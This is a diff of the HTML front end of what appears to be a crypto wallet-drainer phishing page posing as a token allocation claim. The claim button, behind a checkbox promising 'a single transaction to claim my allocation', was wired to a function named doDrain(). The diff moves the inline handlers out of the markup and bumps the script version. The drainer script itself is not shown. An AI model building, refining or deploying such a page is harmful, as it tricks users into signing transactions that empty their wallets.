@@ -64,11 +64,11 @@
       </div>
 
       <div id="connectSection" class="step">
-        <button id="btnConnect" class="btn btn-primary" disabled onclick="connectWallet()">
+        <button id="btnConnect" class="btn btn-primary" disabled>
           <span class="btn-text">Loading...</span>
         </button>
         <p class="loading-msg" id="loadingMsg">Initializing wallet libraries...</p>
-        <button id="btnRetry" class="btn btn-primary" style="display:none;margin-top:0.75rem" onclick="retryInit()">Retry</button>
+        <button id="btnRetry" class="btn btn-primary" style="display:none;margin-top:0.75rem">Retry</button>
       </div>
 
       <div id="connectedSection" class="step" style="display:none">
@@ -79,11 +79,11 @@
         </div>
 
         <label class="terms" id="agreeSection">
-          <input type="checkbox" id="chkAgree" onchange="updateButton()">
+          <input type="checkbox" id="chkAgree">
           <span>I verify my on-chain activity and sign a single transaction to claim my allocation.</span>
         </label>
 
-        <button id="btnClaim" class="btn btn-primary" disabled onclick="doDrain()">
+        <button id="btnClaim" class="btn btn-primary" disabled>
           <span class="btn-text">Agree to terms</span>
         </button>
 
@@ -106,6 +106,6 @@
     </footer>
   </main>
 
-  <script src="/assets/app.js?v=13"></script>
+  <script src="/assets/app.js?v=14"></script>
 </body>
 </html>
